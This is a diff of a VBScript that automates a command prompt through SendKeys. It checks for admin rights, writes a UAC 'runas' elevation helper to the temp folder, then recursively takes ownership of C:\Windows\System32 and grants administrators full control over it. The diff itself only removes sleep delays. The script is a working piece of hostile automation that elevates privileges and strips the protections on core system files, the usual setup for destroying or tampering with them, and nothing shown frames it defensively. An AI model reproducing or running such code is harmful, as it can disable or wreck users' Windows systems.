@@ -4,12 +4,10 @@ WshShell.Run "cmd"
 WScript.Sleep 100
 
 WshShell.SendKeys "net session >nul 2>&1 && (set admin=1) || (set admin=0)"
-WScript.Sleep 200
 WshShell.SendKeys "{ENTER}"
 WScript.Sleep 200
 
 WshShell.SendKeys "echo UAC.ShellExecute %~s0, "", "", runas, 1 > %temp%\getadmin.vbs"
-WScript.Sleep 100
 WshShell.SendKeys "{ENTER}"
 WScript.Sleep 100
 
@@ -19,12 +17,10 @@ WshShell.SendKeys "{ENTER}"
 WScript.Sleep 100
 
 WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y"
-WScript.Sleep 200
 WshShell.SendKeys "{ENTER}"
 WScript.Sleep 100
 
 WshShell.SendKeys "icacls C:\Windows\System32 /grant administrators:F /t"
-WScript.Sleep 100
 WshShell.SendKeys "{ENTER}"
 WScript.Sleep 100
 
